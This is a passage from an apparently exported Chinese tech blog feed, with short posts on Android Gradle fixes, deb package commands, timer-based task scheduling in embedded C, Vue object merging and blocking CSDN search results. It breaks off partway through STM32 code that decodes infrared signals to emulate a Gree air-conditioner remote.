    <title>安卓插件异常</title>
    <url>/posts/87b15a64/</url>
    <content><![CDATA[<p>问题：<br>Caused by: org.gradle.api.internal.plugins.PluginApplicationException: Failed to apply plugin [id ‘com.android.application’]<br>解决办法：<br>在gradle.properties添加<br>android.overridePathCheck&#x3D;true即可</p>
<p><strong>出现原因:一般为挪动了文件夹的位置</strong></p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>安装 删除 卸载 Deb 包文件</title>
    <url>/posts/4b5a1715/</url>
    <content><![CDATA[<h2 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h2><p>直接点击deb文件即可完成安装</p>
<h2 id="命令行界面"><a href="#命令行界面" class="headerlink" title="命令行界面"></a>命令行界面</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">卸载</span></span><br><span class="line">sudo apt-get autoremove 要移除的软件包名</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装</span></span><br><span class="line">sudo apt-get install 要安装的软件包名</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">要安装.deb套件包时</span></span><br><span class="line">sudo dpkg -i package_file.deb</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">要卸载.deb套件包时</span></span><br><span class="line">sudo dpkg -r package_file.deb</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>定时器分时操作系统</title>
    <url>/posts/c8527c44/</url>
    <content><![CDATA[<h2 id="前后台系统，RTOS与定时器任务管理系统"><a href="#前后台系统，RTOS与定时器任务管理系统" class="headerlink" title="前后台系统，RTOS与定时器任务管理系统"></a>前后台系统，RTOS与定时器任务管理系统</h2><p>前后台系统</p>
<p>  在裸机上写程序,通常把程序分为两部分：前台系统和后台系统。</p>
<p>  简单的小系统通常是前后台系统，这样的程序包括一个死循环和若干个中断服务程序：应用程序是一个无限循环，循环中调用API函数完成所需的操作，这个大循环就叫做后台系统。中断服务程序用于处理系统的异步事件，也就是前台系统。前台是中断级，后台是任务级。</p>
<p>写这个系统的目的:</p>
<ol>
<li>为了能够充分利用cpu,不让他闲下来</li>
<li>可以实现多个功能同时发生</li>
</ol>
<p><strong>(前置条件):你需要知道只有一个cpu,他在物理的层面上是不可能同时发生的,但是他们可以欺骗人类,人类的视觉暂留有0.1s到0.4s</strong><br><img src="https://image.zfxt.top/hexo-blog/%E5%AE%9A%E6%97%B6%E5%99%A8%E5%88%86%E6%97%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-2024-04-19-23-10-06.png" alt="定时器分时操作系统-2024-04-19-23-10-06"></p>
<ol>
<li><p>只要这几个任务执行的频率足够高,那么对你而言,他们就是同时发生的.</p>
</li>
<li><p>第二个点就是(化delay为挂起).<br> 假设我们要执行一个跑马灯的操作,如果我们要设置他跑的慢一点,我们可以再他的每个灯显示后添加一个<code>delay(time)</code>,但是在delay期间,我们的cpu是单纯的在等待,什么都没做. 于是我们可以设置一个时间任务,设置多少秒(只要设置和delay一样的时间就可以实现和delay一样的效果)而且在这些时间的间隔可以执行其他的任务</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//原本的功能</span></span><br><span class="line">show()&#123;</span><br><span class="line">    SetLed(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    delay_ms(<span class="number">2</span>);</span><br><span class="line">    SetLed(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">    delay_ms(<span class="number">2</span>);</span><br><span class="line">    SetLed(<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line">    delay_ms(<span class="number">2</span>);</span><br><span class="line">    SetLed(<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line">    delay_ms(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改后</span></span><br><span class="line"></span><br><span class="line">show(u8 w, u8 value)&#123;</span><br><span class="line">    SetLed(w,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//每两秒执行一次</span></span><br><span class="line">per_2ms_conduct()&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    show(i,i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这样子就没有delay出现了,你可以在同时执行其他的功能.</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>对于下面这部分的内容加了注解</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这个函数只做了一件事(时间到了,将flag标志置为1,表示可以做)</span></span><br><span class="line"><span class="comment">//这个Timer-&gt;uCount基于你设置的每次中断所消耗的时间,可以设置的很小,你可以自己调整</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateTimerTask</span><span class="params">(TimerDef *Timer)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Timer-&gt;uCount &gt;= <span class="number">10</span>) <span class="comment">//0.5*10=5 ms到达</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        Timer-&gt;uCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Timer-&gt;uFlag5ms = <span class="number">1</span>; <span class="comment">//5 ms标志位置1</span></span><br><span class="line"></span><br><span class="line">        Timer-&gt;uCount10ms ++;</span><br><span class="line"></span><br><span class="line">        Timer-&gt;uCount50ms ++;</span><br><span class="line"></span><br><span class="line">        Timer-&gt;uCount100ms ++;</span><br><span class="line"></span><br><span class="line">        Timer-&gt;uCount1000ms ++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Timer-&gt;uCount10ms &gt;= <span class="number">2</span>)<span class="comment">//10ms到达</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        Timer-&gt;uCount10ms = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Timer-&gt;uFlag10ms = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Timer-&gt;uCount50ms &gt;= <span class="number">10</span>)<span class="comment">//50ms到达</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        Timer-&gt;uCount50ms = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Timer-&gt;uFlag50ms = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">时间任务管理</span><br><span class="line"></span><br><span class="line"><span class="comment">//大循环任务</span></span><br><span class="line"><span class="comment">//在大循环任务中放入你认为需要定时执行的耗时任务如(Per_5ms_tasks),在把这个大循环放在while(1)里头</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EverWhile_tasks</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//5ms 任务</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Per_5ms_tasks</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(Timer.uFlag5ms != <span class="number">1</span>)<span class="comment">//5ms未到达</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;<span class="comment">//退出函数</span></span><br><span class="line"></span><br><span class="line">task1();<span class="comment">//用户函数</span></span><br><span class="line"></span><br><span class="line">    Timer.uFlag5ms = <span class="number">0</span>;<span class="comment">//清空5ms标志位</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//10ms 任务</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Per_10ms_tasks</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(Timer.uFlag10ms != <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">task2();<span class="comment">//用户函数</span></span><br><span class="line"></span><br><span class="line">    DIU.Timer.uFlag10ms = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//50ms 任务</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Per_50ms_tasks</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(Timer.uFlag50ms != <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">task3();<span class="comment">//用户函数</span></span><br><span class="line"></span><br><span class="line">    Timer.uFlag50ms = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//100ms 任务</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Per_100ms_tasks</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(DIU.Timer.uFlag100ms != <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">task4();<span class="comment">//用户函数</span></span><br><span class="line"></span><br><span class="line">    DIU.Timer.uFlag100ms = <span class="number">0</span>;<span class="comment">// //</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1s 任务</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Per_1s_tasks</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(DIU.Timer.uFlag1000ms != <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">task5();<span class="comment">//用户函数</span></span><br><span class="line"></span><br><span class="line">DIU.Timer.uFlag1000ms = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上,<br>你就可以实现:<br>例如(我每1ms执行一次显示任务,这样在我眼里他就是一直亮着的,<br>每3ms执行一次串口通信,每次访问完后都可以及时把内容输送给限时任务执行.<br>按键任务也是类似的(但是按键要考虑防抖问题,所以你设置的时间间隔需要有考究))</p>
<p>这个时候的cpu就和你一样,飞速运转,一点都没有闲着.</p>
]]></content>
      <tags>
        <tag>嵌入式</tag>
      </tags>
  </entry>
  <entry>
    <title>安装双系统（win+unbuntu)</title>
    <url>/posts/8d78cfd3/</url>
    <content><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/617640635">https://zhuanlan.zhihu.com/p/617640635</a></p>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>家庭服务器Home Server实践</title>
    <url>/posts/7a8dcea3/</url>
    <content><![CDATA[<blockquote>
<p>引用自<a href="https://sspai.com/post/82512">家庭服务器Home Server实践</a></p>
</blockquote>
<p>大佬写的很好，我这里不赘述，这些都是我在家庭服务器上实践过的，非常有用。</p>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>家庭服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>实体、视图对象、数据传输对象关系</title>
    <url>/posts/4a9e831e/</url>
    <content><![CDATA[<p>1、entity 里的每一个字段，与数据库相对应，</p>
<p>2、vo 里的每一个字段，是和你前台 html 页面相对应，</p>
<p>3、dto 这是用来转换从 entity 到 vo，或者从 vo 到 entity 的中间的东西 。</p>
<p>举个例子：</p>
<p>你的html页面上有三个字段，name，pass，age</p>
<p>你的数据库表里，有两个字段，name，pass ， 注意没有 age。</p>
<p>而你的 vo 里，就应该有下面三个成员变量 ，因为对应 html 页面上三个字段 。</p>
<blockquote>
<p> dto 和 entity 里面的字段应该是一样的，dto 只是 entity 到 vo，或者 vo 到 entity 的中间过程，如果没有这个过程，你仍然可以做到增删改查，这是根据具体公司规范来的 。</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>容器编排工具比较：Docker vs Podman</title>
    <url>/posts/c1def6a7/</url>
    <content><![CDATA[<h2 id="这两个技术都是容器编排工具。他们都有各自的优势和特点。"><a href="#这两个技术都是容器编排工具。他们都有各自的优势和特点。" class="headerlink" title="这两个技术都是容器编排工具。他们都有各自的优势和特点。"></a>这两个技术都是容器编排工具。他们都有各自的优势和特点。</h2><p>其中，docker有其自己的一体化解决方案。</p>
<blockquote>
<p><a href="https://juejin.cn/post/7112334606430371854">docker与podman的对比</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>podman</tag>
      </tags>
  </entry>
  <entry>
    <title>对象属性合并</title>
    <url>/posts/5e6eb7a1/</url>
    <content><![CDATA[<h1 id="合并对象"><a href="#合并对象" class="headerlink" title="合并对象"></a>合并对象</h1><p>this.info &#x3D; {…this.info,…dataObj)<br>它会将this.info和dataObj的所有属性合并，如果有重复的，优先取后边dataObj的。最后整合后提交给this.info</p>
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>屏蔽csdn</title>
    <url>/posts/6d15f173/</url>
    <content><![CDATA[<h2 id="天下苦csdn久矣"><a href="#天下苦csdn久矣" class="headerlink" title="天下苦csdn久矣"></a>天下苦csdn久矣</h2><p>每次在浏览器中搜索想要得到的答案时，前几个选项总会是csdn的内容。而对于csdn.<br>我曾经是包容的，能接受的，但是他对登陆的要求太多了</p>
<ul>
<li>你点进csdn,他就会是一个5s的登陆请求，5s后才能关闭</li>
<li>还有他乱七八糟的广告内容和付费内容</li>
<li>关注后才能继续观看文章</li>
<li>其次在没登陆的情况下，他还不能进行复制（虽然可以通过关闭javascript来实现复制）但是他的每个弹窗都让我感到繁琐。</li>
<li>同样的问题我可以在知乎，stackoverflow,掘金找到答案</li>
</ul>
<p>既然如此，我毅然决然的选择将csdn从我的世界中革除</p>
<p>使用插件uBlacklist屏蔽搜索结果中的csdn的内容<br><img src="https://image.zfxt.top/hexo-blog/%E5%B1%8F%E8%94%BDcsdn-2024-03-25-10-40-46.png" alt="屏蔽csdn-2024-03-25-10-40-46"><br><img src="https://image.zfxt.top/hexo-blog/%E5%B1%8F%E8%94%BDcsdn-2024-03-25-10-45-38.png" alt="屏蔽csdn-2024-03-25-10-45-38"></p>
<p>这样子后，你就不会在搜索结果中看到任何关于csdn的内容来</p>
]]></content>
      <categories>
        <category>优化浏览器体验</category>
      </categories>
  </entry>
  <entry>
    <title>嵌入式模拟格力空调遥控器</title>
    <url>/posts/7d1fbdb2/</url>
    <content><![CDATA[<blockquote>
<p>记录一下：在嵌入式实验中，通过实现模拟格力空调的红外信号实现了使用单片机遥控空调的效果。</p>
</blockquote>
<h2 id="红外信号传输原理"><a href="#红外信号传输原理" class="headerlink" title="红外信号传输原理"></a>红外信号传输原理</h2><h3 id="红外线的通讯原理"><a href="#红外线的通讯原理" class="headerlink" title="红外线的通讯原理"></a>红外线的通讯原理</h3><p> 红外光是以特定的频率脉冲形式发射，接收端收到到信号后，按照约定的协议进行解码，完成数据传输，在消费类电子产品里，脉冲频率普遍采用 30KHz 到 60KHz 这个频段，NEC协议的频率就是38KHZ。 这个以特定的频率发射其实就可以理解为点灯，不要被复杂的词汇难住了，就是控制灯的闪烁频率(亮灭)，和刚学单片机完成闪光灯一样的意思，只不过是灯换了一种类型，都是灯。 接收端的原理: 接收端的芯片对这个红外光比较敏感，可以根据有没有光输出高低电平，如果发送端的闪烁频率是有规律的，接收端收到后输出的高电平和低电平也是有规律对应的，这样发送端和接收端只要约定好，那就可以做数据传输了。</p>
<h3 id="红外接收原理"><a href="#红外接收原理" class="headerlink" title="红外接收原理"></a>红外接收原理</h3><h4 id="NEC协议"><a href="#NEC协议" class="headerlink" title="NEC协议"></a>NEC协议</h4><p>NEC协议是众多红外线协议中的一种(这里说的协议就是他们数据帧格式定义不一样，数据传输原理都是一样的)，我们购买的外能遥控器、淘宝买的mini遥控器、电视机、投影仪几乎都是NEC协议。 像格力空调、美的空调这些设备使用的就是其他协议格式，不是NEC协议，但是只要学会一种协议解析方式，明白了红外线传输原理，其他遥控器协议都可以解出来。</p>
<p>NEC格式完成一次数据传输的完整格式<br><img src="https://image.zfxt.top/hexo-blog/tasks-2024-05-21-19-54-53.png" alt="tasks-2024-05-21-19-54-53"></p>
<p><strong>引导码</strong>: 由9ms的高电平+4.5ms的低电平组成。<br>4个字节的数据: 用户码+用户反码+数据码+数据反码。 这里的反码可以用来校验数据是否传输正确，有没有丢包。</p>
<p><strong>重点</strong>: NEC协议传输数据位的时候，0和1的区分是依靠收到的高、低电平的持续时间来进行区分的—这是解码关键。<br>标准间隔时间：0.56ms<br>收到数据位0: 0.56ms<br>收到位1: 1.68ms</p>
<p>所以，收到一个数据位的完整时间表示方法是这样的：<br><strong>收到数据位0</strong>: 0.56m低电平+ 0.56ms的高电平<br><strong>收到数据位1</strong>: 0.56ms低电平+1.68ms的高电平</p>
<p><strong>红外线接收头模块输出电平的原理：</strong> 红外线接收头感应到有红外光就输出低电平，没有感应到红外光就输出高电平。</p>
<h3 id="红外发送原理"><a href="#红外发送原理" class="headerlink" title="红外发送原理"></a>红外发送原理</h3><p><img src="https://image.zfxt.top/hexo-blog/%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%A8%A1%E6%8B%9F%E6%A0%BC%E5%8A%9B%E7%A9%BA%E8%B0%83%E9%81%A5%E6%8E%A7%E5%99%A8-2024-05-21-20-02-16.png" alt="嵌入式模拟格力空调遥控器-2024-05-21-20-02-16"><br>首先，需要理解是，发送信号时，我们需要发送的是<strong>方波</strong>，而不是一条直线，在上图中可以看出来，如果我们要发送一个数据”1”，那么我们就要先发送560μs的高电平和1680μs的低电平，<strong>而要发送这个高电平就需要使用38khz的频率去交替发送高低电位</strong>，持续560μs，才可以正确发射红外光。而低电平就会比较简单。只要保持0电位即可。</p>
<p><strong>交替发送高电平</strong>&#x3D;&gt; 发射红外光<br><strong>直接发送低电平</strong>&#x3D;&gt; 不发射红外光</p>
<p>原理如上：<br>下面上代码：</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h3 id="接受模块"><a href="#接受模块" class="headerlink" title="接受模块"></a>接受模块</h3><p><strong>初始化：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Remote_Init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    RCC-&gt;APB1ENR |= <span class="number">1</span> &lt;&lt; <span class="number">2</span>; <span class="comment">// TIM4 时钟使能</span></span><br><span class="line">    RCC-&gt;APB2ENR |= <span class="number">1</span> &lt;&lt; <span class="number">4</span>; <span class="comment">// 使能PORTC时钟</span></span><br><span class="line"></span><br><span class="line">    GPIOC-&gt;CRH &amp;= <span class="number">0XFFFF0FFF</span>; <span class="comment">// PC11 输入</span></span><br><span class="line">    GPIOC-&gt;CRH |= <span class="number">0X00008000</span>; <span class="comment">// 上拉输入</span></span><br><span class="line">    <span class="comment">// GPIOC-&gt;ODR|=1&lt;&lt;11;//PC11 上拉</span></span><br><span class="line"></span><br><span class="line">    TIM4-&gt;ARR = <span class="number">10000</span>; <span class="comment">// 设定计数器自动重装值 最大10ms溢出</span></span><br><span class="line">    TIM4-&gt;PSC = <span class="number">71</span>;	   <span class="comment">// 预分频器,1M的计数频率,1us加1.</span></span><br><span class="line"></span><br><span class="line">    TIM4-&gt;DIER |= <span class="number">1</span> &lt;&lt; <span class="number">0</span>; <span class="comment">// 允许更新中断</span></span><br><span class="line">    TIM4-&gt;CR1 |= <span class="number">0x01</span>;<span class="comment">// 使能定时器4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// MY_NVIC_Init(1, 3, TIM4_IRQChannel, 2); // 抢占1，子优先级3，组2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置外部中断</span></span><br><span class="line">    Ex_NVIC_Config(GPIO_C, <span class="number">11</span>, <span class="number">3</span>); <span class="comment">// 全频段触发</span></span><br><span class="line">    MY_NVIC_Init(<span class="number">0</span>, <span class="number">2</span>, EXTI15_10_IRQChannel, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一部分设置PCin(11)为红外接受的端口。然后设置了外部中断来作为监听信息的变化，如果产生了高低电平的变化，都会调用<code>EXTI15_10_IRQHandler()</code>函数。然后初始化了TIM4定时器，用来记录时间的长短。<br><strong>启用关闭红外接受功能</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 打开红外接收</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Remote_ON</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 禁用 EXTI 第11线</span></span><br><span class="line">    EXTI-&gt;IMR |= (<span class="number">1</span> &lt;&lt; <span class="number">11</span>); <span class="comment">// 禁用中断掩码寄存器上的第11位</span></span><br><span class="line">    EXTI-&gt;EMR |= (<span class="number">1</span> &lt;&lt; <span class="number">11</span>); <span class="comment">// 禁用事件掩码寄存器上的第11位</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 关闭红外接收</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Remote_OFF</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 禁用 EXTI 第11线</span></span><br><span class="line">    EXTI-&gt;IMR &amp;= ~(<span class="number">1</span> &lt;&lt; <span class="number">11</span>); <span class="comment">// 禁用中断掩码寄存器上的第11位</span></span><br><span class="line">    EXTI-&gt;EMR &amp;= ~(<span class="number">1</span> &lt;&lt; <span class="number">11</span>); <span class="comment">// 禁用事件掩码寄存器上的第11位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在单片机上，如果同时存在红外发射和红外接受，就可能会导致，你发射信号然后自己接收到，于是就会有每发一个信号就中断接受一次信号，导致数据的延时出现问题。所以在每次发送红外信息时，需要关闭红外接受功能。<br><strong>测量电平时间</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">函数功能: 测量高电平持续的时间</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">u32 <span class="title function_">Infrared_GetTime_H</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    TIM4-&gt;CNT = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (RDATA)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125; <span class="comment">// 等待高电平结束</span></span><br><span class="line">    <span class="keyword">return</span> TIM4-&gt;CNT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">函数功能: 测量低电平持续的时间</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">u32 <span class="title function_">Infrared_GetTime_L</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    TIM4-&gt;CNT = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!RDATA)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125; <span class="comment">// 等待高电平结束</span></span><br><span class="line">    <span class="keyword">return</span> TIM4-&gt;CNT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这个功能,来判断是否符合560和1680的时间。<br><strong>具体的接受功能</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">other_remote_get</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	time = Infrared_GetTime_L();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (time &lt; <span class="number">7000</span> || time &gt; <span class="number">10000</span>)</span><br><span class="line">		<span class="keyword">return</span>; <span class="comment">// 标准时间: 9000us</span></span><br><span class="line"></span><br><span class="line">	times_low[<span class="number">0</span>] = time;</span><br><span class="line">	time = Infrared_GetTime_H();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 得到高电平时间</span></span><br><span class="line">	<span class="keyword">if</span> (time &lt; <span class="number">3000</span> || time &gt; <span class="number">5500</span>)</span><br><span class="line">		<span class="keyword">return</span>; <span class="comment">// 标准时间4500us</span></span><br><span class="line"></span><br><span class="line">	times_high[<span class="number">0</span>] = time;</span><br><span class="line">	<span class="comment">// printf(&quot;高电平时间为%d\n&quot;,time);</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		time = Infrared_GetTime_L();</span><br><span class="line">		<span class="comment">// 得到低电平时间</span></span><br><span class="line">		times_low[<span class="number">1</span> + i] = time;</span><br><span class="line">		<span class="keyword">if</span> (time &lt; <span class="number">400</span> || time &gt; <span class="number">800</span>)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		<span class="comment">// 标准时间: 560us</span></span><br><span class="line">		time = Infrared_GetTime_H(); <span class="comment">// 得到高电平时间</span></span><br><span class="line">		times_high[<span class="number">1</span> + i] = time;</span><br><span class="line">		<span class="keyword">if</span> (time &gt; <span class="number">1400</span> &amp;&amp; time &lt; <span class="number">1800</span>) <span class="comment">// 数据1 1680us</span></span><br><span class="line">		&#123;</span><br><span class="line">			datas[i] = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (time &gt; <span class="number">400</span> &amp;&amp; time &lt; <span class="number">700</span>) <span class="comment">// 数据0 560us</span></span><br><span class="line">		&#123;</span><br><span class="line">			datas[i] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 第一段数据结束</span></span><br><span class="line"></span><br><span class="line">	time = Infrared_GetTime_L();</span><br><span class="line">	<span class="comment">// 得到低电平时间</span></span><br><span class="line">	<span class="keyword">if</span> (time &lt; <span class="number">400</span> || time &gt; <span class="number">700</span>)</span><br><span class="line">		<span class="keyword">return</span>; <span class="comment">// 标准时间: 600us</span></span><br><span class="line">	times_low[<span class="number">36</span>] = time;</span><br><span class="line">	time = Infrared_GetTime_H();</span><br><span class="line">	<span class="comment">// 得到高电平时间</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (time &lt; <span class="number">6000</span> || time &gt; <span class="number">13000</span>)</span><br><span class="line">		<span class="keyword">return</span>; <span class="comment">// 标准时间4500us</span></span><br><span class="line">	times_high[<span class="number">36</span>] = time;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		time = Infrared_GetTime_L();</span><br><span class="line">		<span class="comment">// printf(&quot;32位数据码之%d，时间为%d\n&quot;,i+1,time);</span></span><br><span class="line">		times_low[<span class="number">37</span> + i] = time;</span><br><span class="line">		<span class="comment">// 得到低电平时间</span></span><br><span class="line">		<span class="keyword">if</span> (time &lt; <span class="number">400</span> || time &gt; <span class="number">800</span>)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 标准时间: 560us</span></span><br><span class="line"></span><br><span class="line">		time = Infrared_GetTime_H(); <span class="comment">// 得到高电平时间</span></span><br><span class="line">		times_high[<span class="number">37</span> + i] = time;</span><br><span class="line">		<span class="keyword">if</span> (time &gt; <span class="number">1300</span> &amp;&amp; time &lt; <span class="number">1900</span>) <span class="comment">// 数据1 1680us</span></span><br><span class="line">		&#123;</span><br><span class="line">			datas[<span class="number">35</span> + i] = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (time &gt; <span class="number">400</span> &amp;&amp; time &lt; <span class="number">700</span>) <span class="comment">// 数据0 560us</span></span><br><span class="line">		&#123;</span><br><span class="line">			datas[<span class="number">35</span> + i] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">67</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, datas[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;低电平时间\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">69</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span 